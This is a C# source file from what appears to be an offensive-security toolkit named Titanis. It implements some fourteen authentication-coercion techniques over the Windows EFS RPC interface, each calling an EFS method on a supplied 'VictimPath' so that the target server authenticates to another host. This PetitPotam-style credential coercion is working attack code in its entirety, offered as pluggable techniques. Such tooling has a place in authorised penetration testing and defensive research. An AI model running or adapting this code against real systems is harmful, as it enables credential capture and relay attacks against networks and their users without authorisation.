using ms_efsr;
using System.Net;
using Titanis.Cli;
using Titanis.Msrpc;
using Titanis.Msrpc.Msefsr;
using Titanis.Net;
using Titanis.Security;
using Titanis.Smb2;

namespace Titanis.CredCoerce
{
	abstract class EfsCoercionTechnique : CoercionTechnique
	{
		private readonly Func<EfsClient, CoercionContext, CancellationToken, Task> func;

		internal EfsCoercionTechnique()
		{
		}

		public sealed override async Task Execute(CoercionContext context, CancellationToken cancellationToken)
		{
			var efs = context.TryGetService<EfsClient>();
			if (efs is null)
			{
				efs = new EfsClient();
				var epm = context.EpmClient;
				try
				{
					var efsEP = await epm.TryMapTcp(efs.AbstractSyntaxId, IPAddress.Any, cancellationToken);
				}
				catch (TimeoutException ex)
				{
					// This usually happens when the service is already running
					context.Log.WriteVerbose("EPM lookup for EFS time out; this usually indicates the service is already running on the target");
				}

				ServicePrincipalName targetSpn = new(context.ServerName, ServiceClassNames.HostU);

				var rpcClient = context.RpcClient;
				var smbClient = context.SmbClient;

				// Connect to EFS
				efs = new EfsClient();
				await rpcClient.ConnectPipe(efs, smbClient, new UncPath(context.ServerName, Smb2Client.IpcName, EfsClient.EfsPipeName), cancellationToken);

				context.AddService(efs);
			}

			await this.Execute(efs, context, cancellationToken);
		}

		protected abstract Task Execute(EfsClient? efs, CoercionContext context, CancellationToken cancellationToken);
	}

	[Component(typeof(CoercionTechnique), "Efs.OpenFile")]
	sealed class EfsOpenFileTechnique : EfsCoercionTechnique
	{
		protected sealed override Task Execute(EfsClient efs, CoercionContext context, CancellationToken cancellationToken)
			=> efs.OpenFile(context.VictimPath, cancellationToken);
	}

	[Component(typeof(CoercionTechnique), "Efs.EncryptFile")]
	sealed class EfsEncryptFileTechnique : EfsCoercionTechnique
	{
		protected sealed override Task Execute(EfsClient efs, CoercionContext context, CancellationToken cancellationToken)
			=> efs.EncryptFile(context.VictimPath, cancellationToken);
	}

	[Component(typeof(CoercionTechnique), "Efs.DecryptFile")]
	sealed class EfsDecryptFileTechnique : EfsCoercionTechnique
	{
		protected sealed override Task Execute(EfsClient efs, CoercionContext context, CancellationToken cancellationToken)
			=> efs.DecryptFile(context.VictimPath, cancellationToken);
	}

	[Component(typeof(CoercionTechnique), "Efs.QueryUsersOnFile")]
	sealed class EfsQueryUsersOnFileTechnique : EfsCoercionTechnique
	{
		protected sealed override Task Execute(EfsClient efs, CoercionContext context, CancellationToken cancellationToken)
			=> efs.QueryUsersOnFile(context.VictimPath, cancellationToken);
	}

	[Component(typeof(CoercionTechnique), "Efs.QueryRecoveryAgents")]
	sealed class EfsQueryRecoveryAgentsTechnique : EfsCoercionTechnique
	{
		protected sealed override Task Execute(EfsClient efs, CoercionContext context, CancellationToken cancellationToken)
			=> efs.QueryRecoveryAgents(context.VictimPath, cancellationToken);
	}

	[Component(typeof(CoercionTechnique), "Efs.RemoveUsersFromFile")]
	sealed class EfsRemoveUsersFromFileTechnique : EfsCoercionTechnique
	{
		protected sealed override Task Execute(EfsClient efs, CoercionContext context, CancellationToken cancellationToken)
			=> efs.RemoveUsersFromFile(context.VictimPath, new EncryptionCertificateHash[0], cancellationToken);
	}

	[Component(typeof(CoercionTechnique), "Efs.AddUsersToFile")]
	sealed class EfsAddUsersToFileTechnique : EfsCoercionTechnique
	{
		protected sealed override Task Execute(EfsClient efs, CoercionContext context, CancellationToken cancellationToken)
			=> efs.AddUsersToFile(context.VictimPath, null, cancellationToken);
	}

	[Component(typeof(CoercionTechnique), "Efs.FileKeyInfo")]
	sealed class EfsFileKeyInfoTechnique : EfsCoercionTechnique
	{
		protected sealed override Task Execute(EfsClient efs, CoercionContext context, CancellationToken cancellationToken)
			=> efs.GetBasicFileKeyInfo(context.VictimPath, cancellationToken);
	}

	[Component(typeof(CoercionTechnique), "Efs.DuplicateEncryptionInfoFile")]
	sealed class EfsDuplicateEncryptionInfoFileTechnique : EfsCoercionTechnique
	{
		protected sealed override Task Execute(EfsClient efs, CoercionContext context, CancellationToken cancellationToken)
			=> efs.DuplicateEncryptionInfoFile(context.VictimPath, context.VictimPath, Winterop.FileAttributes.Normal, true, new Winterop.Security.SecurityDescriptor(Winterop.Security.SecurityDescriptorControl.None, null, null, null, null), cancellationToken);
	}

	[Component(typeof(CoercionTechnique), "Efs.AddUsersToFileEx")]
	sealed class EfsAddUsersToFileExTechnique : EfsCoercionTechnique
	{
		protected sealed override Task Execute(EfsClient efs, CoercionContext context, CancellationToken cancellationToken)
			=> efs.AddUsersToFile(context.VictimPath, null, EfsClient.EfsAddUsersOptions.None, cancellationToken);
	}

	[Component(typeof(CoercionTechnique), "Efs.FileKeyInfoEx")]
	sealed class EfsFileKeyInfoExTechnique : EfsCoercionTechnique
	{
		protected sealed override Task Execute(EfsClient efs, CoercionContext context, CancellationToken cancellationToken)
			=> efs.GetBasicFileKeyInfo(context.VictimPath, BasicFileKeyFlags.None, cancellationToken);
	}

	[Component(typeof(CoercionTechnique), "Efs.GetEncryptedFileMetadata")]
	sealed class EfsGetEncryptedFileMetadataTechnique : EfsCoercionTechnique
	{
		protected sealed override Task Execute(EfsClient efs, CoercionContext context, CancellationToken cancellationToken)
			=> efs.GetEncryptedFileMetadata(context.VictimPath, cancellationToken);
	}

	[Component(typeof(CoercionTechnique), "Efs.SetEncryptedFileMetadata")]
	sealed class EfsSetEncryptedFileMetadataTechnique : EfsCoercionTechnique
	{
		protected sealed override Task Execute(EfsClient efs, CoercionContext context, CancellationToken cancellationToken)
			=> efs.SetEncryptedFileMetadata(context.VictimPath, Array.Empty<byte>(), cancellationToken);
	}

	[Component(typeof(CoercionTechnique), "Efs.EncryptFileExSrv")]
	sealed class EfsEncryptFileExSrvTechnique : EfsCoercionTechnique
	{
		protected sealed override Task Execute(EfsClient efs, CoercionContext context, CancellationToken cancellationToken)
			=> efs.EncryptFile(context.VictimPath, null, cancellationToken);
	}
}
